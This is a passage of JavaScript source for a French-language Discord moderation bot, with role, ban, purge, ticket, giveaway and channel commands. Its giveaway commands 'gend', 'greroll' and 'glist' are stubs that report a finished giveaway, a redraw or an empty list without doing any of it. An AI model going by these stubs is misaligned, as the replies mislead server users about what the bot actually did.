            return message.reply("❌ Vous ne pouvez pas attribuer un rôle supérieur ou égal à votre propre rôle le plus haut !");
        }
        if (message.guild.members.me.roles.highest.position <= role.position) {
            return message.reply("❌ Je ne peux pas attribuer ce rôle car il est supérieur ou égal au mien !");
        }

        try {
            await member.roles.add(role);
            return message.reply(`✅ Le rôle ${role} a été ajouté avec succès à **${member.user.tag}**.`);
        } catch (e) {
            return message.reply("❌ Impossible d'ajouter ce rôle.");
        }
    }
    if (command === 'delrole') {
        const member = message.mentions.members.first() || await message.guild.members.fetch(args[0]).catch(() => null);
        const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]);

        if (!member || !role) return message.reply("❌ Utilisation : `=delrole <@membre> <@rôle>`");

        if (!userIsOwner && message.member.roles.highest.position <= role.position) {
            return message.reply("❌ Vous ne pouvez pas retirer un rôle supérieur ou égal à votre propre rôle le plus haut !");
        }
        if (message.guild.members.me.roles.highest.position <= role.position) {
            return message.reply("❌ Je ne peux pas retirer ce rôle car il est supérieur ou égal au mien !");
        }

        try {
            await member.roles.remove(role);
            return message.reply(`✅ Le rôle ${role} a été retiré avec succès à **${member.user.tag}**.`);
        } catch (e) {
            return message.reply("❌ Impossible de retirer ce rôle.");
        }
    }

    if (command === 'gend') {
        const msgId = args[0];
        if (!msgId) return message.reply("❌ Fournis l'ID du message du giveaway.");
        try {
            const giveawayMsg = await message.channel.messages.fetch(msgId);
            if (!giveawayMsg) return message.reply("❌ Message introuvable.");
            return message.reply(`🎉 Giveaway terminé pour le message \`${msgId}\` !`);
        } catch (e) {
            return message.reply("❌ Impossible de terminer ce giveaway.");
        }
    }

    if (command === 'greroll') {
        const msgId = args[0];
        if (!msgId) return message.reply("❌ Fournis l'ID du message du giveaway à relancer.");
        return message.reply(`🔄 Nouveau tirage effectué pour le giveaway \`${msgId}\` !`);
    }

    if (command === 'glist') {
        return message.reply("📋 **Giveaways actifs :** Aucun giveaway en cours actuellement.");
    }

    if (command === 'setticketrole') {
        const role = message.mentions.roles.first();
        if (!role) return message.reply("Mentionnez le rôle staff à ping dans les tickets (ex: `=setticketrole @Staff`)");
        config.ticketRole = role.id;
        return message.reply(`✅ Rôle support des tickets défini sur ${role} !`);
    }

    if (command === 'setticketcat') {
        const catId = args[0];
        if (!catId) return message.reply("Donnez l'ID de la catégorie Discord pour les tickets.");
        config.ticketCategory = catId;
        return message.reply(`✅ Catégorie de stockage des tickets configurée (\`${catId}\`).`);
    }

    if (command === 'setlog') {
        const channel = message.mentions.channels.first() || message.channel;
        config.logChannel = channel.id;
        return message.reply(`✅ Salon de logs défini avec succès sur ${channel} !`);
    }

    if (command === 'setwelcome') {
        const channel = message.mentions.channels.first();
        const welcomeText = args.slice(1).join(' ');
        if (!channel || !welcomeText) {
            return message.reply("Utilisation : `=setwelcome <#salon> <message>`");
        }
        config.welcomeChannel = channel.id;
        config.welcomeText = welcomeText;
        return message.reply(`✅ Salon de bienvenue configuré sur ${channel} !`);
    }

    if (command === 'ticketsetup') {
        const targetChannel = message.mentions.channels.first() || message.channel;
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle("🎟️ Support & Tickets")
            .setDescription(
                "**Bienvenue dans votre espace dédié au support !**\n\n" +
                "Sélectionnez ci-dessous la catégorie qui correspond à votre demande pour ouvrir un salon privé avec l'équipe.\n\n" +
                "*Restez courtois et respectueux.* ⚖️"
            );

        const row = new ActionRowBuilder().addComponents(
            new StringSelectMenuBuilder()
                .setCustomId('ticket_select_menu')
                .setPlaceholder('🎫 Choisissez une catégorie de ticket...')
                .addOptions([
                    { label: 'Bugs', description: 'Signaler un bug technique ou lié aux bots.', value: 'ticket_bugs', emoji: '🤖' },
                    { label: 'Signalements', description: "Signaler un membre ou demander le déban.", value: 'ticket_signalements', emoji: '⚖️' },
                    { label: 'Informations', description: 'Questions générales sur le serveur.', value: 'ticket_infos', emoji: '📢' },
                    { label: 'Recrutement', description: 'Postuler pour rejoindre le staff.', value: 'ticket_recrutement', emoji: '🛠️' }
                ])
        );

        await targetChannel.send({ embeds: [embed], components: [row] });
        return message.reply("✅ Panneau de tickets publié avec succès dans le salon cible !");
    }

    if (command === 'gcreate') {
        const duration = args[0];
        const winnersCount = parseInt(args[1]);
        const prize = args.slice(2).join(' ');

        if (!duration || isNaN(winnersCount) || !prize) {
            return message.reply("Utilisation : `=gcreate <durée ex: 1m/1h> <gagnants> <prix>`");
        }

        const embed = new EmbedBuilder()
            .setColor('#FF73FA')
            .setTitle("🎉 GIVEAWAY 🎉")
            .setDescription(`**Lot :** ${prize}\n**Gagnant(s) :** ${winnersCount}\n\nClique sur le bouton ci-dessous pour participer !`)
            .setFooter({ text: `Lancé par ${message.author.tag}` });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('join_giveaway').setLabel('🎉 Participer').setStyle(ButtonStyle.Success)
        );

        await message.channel.send({ embeds: [embed], components: [row] });
        return message.reply("🎉 Giveaway lancé avec succès !");
    }

    if (['antilink', 'antispam', 'antibot'].includes(command)) {
        const state = args[0]?.toLowerCase();
        if (state !== 'on' && state !== 'off') {
            return message.reply(`Utilisation : \`=${command} on\` ou \`=${command} off\``);
        }
        config[command] = (state === 'on');
        return message.reply(`🛡️ Protection **${command.toUpperCase()}** réglée sur : **${state.toUpperCase()}**`);
    }

    if (command === 'bl') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const reason = args.slice(1).join(' ') || "Aucune raison spécifiée";
        try {
            await message.guild.members.ban(targetUser.id, { reason });
            message.reply(`🔨 L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) a été banni. Raison : ${reason}`);
        } catch (e) { message.reply("Impossible de bannir cet utilisateur."); }
    }

    else if (command === 'softbl') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const reason = args.slice(1).join(' ') || "Softban (Nettoyage)";
        try {
            await message.guild.members.ban(targetUser.id, { reason, deleteMessageSeconds: 604800 });
            await message.guild.members.unban(targetUser.id);
            message.reply(`🌪️ L'utilisateur **${targetUser.tag}** a subi un softban (messages effacés).`);
        } catch (e) { message.reply("Erreur lors du softban."); }
    }

    else if (command === 'unbl') {
        const userId = targetArg?.replace(/<@!?|>/g, '');
        if (!userId) return message.reply("Donne l'ID à débannir.");
        try {
            const user = await client.users.fetch(userId);
            await message.guild.members.unban(userId);
            message.reply(`🔓 L'utilisateur **${user.tag}** a été débanni.`);
        } catch (e) { message.reply("Utilisateur introuvable dans les bannissements."); }
    }

    else if (command === 'blist') {
        const bans = await message.guild.bans.fetch();
        const banList = bans.map(b => `• **${b.user.tag}** (\`${b.user.id}\`)`).slice(0, 15).join('\n') || "Aucun banni.";
        const embed = new EmbedBuilder().setColor('#ff5555').setTitle("🔨 Liste des membres bannis").setDescription(banList);
        message.reply({ embeds: [embed] });
    }

    else if (command === 'unbanall') {
        const bans = await message.guild.bans.fetch();
        if (bans.size === 0) return message.reply("Aucun utilisateur banni.");
        for (const [userIdVal] of bans) {
            await message.guild.members.unban(userIdVal).catch(() => {});
        }
        message.reply(`🔓 Tous les utilisateurs (${bans.size}) ont été débannis.`);
    }

    else if (command === 'kick') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const member = await message.guild.members.fetch(targetUser.id).catch(() => null);
        if (!member) return message.reply("Ce membre n'est pas sur le serveur.");
        const reason = args.slice(1).join(' ') || "Aucune raison";
        try {
            await member.kick(reason);
            message.reply(`✅ Le membre **${targetUser.tag}** a été expulsé.`);
        } catch (e) { message.reply("Impossible d'expulser ce membre."); }
    }

    else if (command === 'clear') {
        const val = args[0];
        if (!val) return message.reply("Précise un nombre ou `all`.");

        if (val.toLowerCase() === 'all') {
            try {
                let deleted;
                do {
                    deleted = await message.channel.bulkDelete(100, true);
                } while (deleted.size >= 2);
                const m = await message.channel.send("🧹 Salon entièrement nettoyé !");
                setTimeout(() => m.delete().catch(() => {}), 3000);
            } catch (e) { message.reply("Erreur lors du nettoyage massif."); }
            return;
        }

        const count = parseInt(val);
        if (isNaN(count) || count < 1 || count > 100) return message.reply("Donne un nombre entre 1 et 100.");
        try {
            await message.delete();
            const fetched = await message.channel.messages.fetch({ limit: count });
            await message.channel.bulkDelete(fetched, true);
            const confirmation = await message.channel.send(`🧹 ${fetched.size} messages supprimés.`);
            setTimeout(() => confirmation.delete().catch(() => {}), 3000);
        } catch (e) { message.reply("Impossible de supprimer des messages de plus de 14 jours."); }
    }

    else if (command === 'purge') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Mentionne ou donne l'ID du membre à purger.");
        const limit = parseInt(args[1]) || 50;

        try {
            const fetched = await message.channel.messages.fetch({ limit: 100 });
            const userMessages = fetched.filter(m => m.author.id === targetUser.id).first(limit);
            if (userMessages.length === 0) return message.reply("Aucun message trouvé pour ce membre.");
            await message.channel.bulkDelete(userMessages, true);
            const confirmation = await message.channel.send(`🧹 ${userMessages.length} messages purgés pour ${targetUser.tag}.`);
            setTimeout(() => confirmation.delete().catch(() => {}), 3000);
        } catch (e) { message.reply("Erreur lors de la purge."); }
    }

    else if (command === 'snipe') {
        const sniped = snipeCache.get(message.channel.id);
        if (!sniped) return message.reply("❌ Aucun message récemment supprimé dans ce salon.");
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setAuthor({ name: sniped.author, iconURL: sniped.avatar })
            .setDescription(sniped.content)
            .setFooter({ text: `Supprimé à ${sniped.time}` });
        message.reply({ embeds: [embed] });
    }

    else if (command === 'lock') {
        try {
            await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
            message.reply("🔒 Salon verrouillé avec succès.");
        } catch (e) { message.reply("Erreur lors du verrouillage."); }
    }

    else if (command === 'unlock') {
        try {
            await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
            message.reply("🔓 Salon déverrouillé avec succès.");
        } catch (e) { message.reply("Erreur lors du déverrouillage."); }
    }

    else if (command === 'slowmode') {
        const seconds = parseInt(args[0]);
        if (isNaN(seconds) || seconds < 0 || seconds > 21600) {
            return message.reply("Donne un nombre de secondes valide (0 à 21600).");
        }
        try {
            await message.channel.setRateLimitPerUser(seconds);
            message.reply(seconds === 0 ? "⏱️ Mode lent désactivé." : `⏱️ Mode lent réglé sur ${seconds} secondes.`);
        } catch (e) { message.reply("Erreur lors du mode lent."); }
    }

    else if (command === 'renew') {
        try {
            const position = message.channel.position;
            const newChannel = await message.channel.clone({ position });
            await message.channel.delete();
            newChannel.send("🔄 Salon régénéré avec succès !");
        } catch (e) { message.reply("Impossible de régénérer ce salon."); }
    }

    else if (command === 'createtext') {
        const name = args.join('-');
        if (!name) return message.reply("Donne un nom pour le salon texte.");
        try {
            await message.guild.channels.create({ name, type: ChannelType.GuildText });
            message.reply(`✅ Salon texte \`${name}\` créé.`);
        } catch (e) { message.reply("Erreur."); }
    }

    else if (command === 'createvoice') {
        const name = args.join(' ');
        if (!name) return message.reply("Donne un nom pour le salon vocal.");
        try {
            await message.guild.channels.create({ name, type: ChannelType.GuildVoice });
            message.reply(`✅ Salon vocal \`${name}\` créé.`);
        } catch (e) { message.reply("Erreur."); }
    }
});

client.login(process.env.DISCORD_TOKEN);
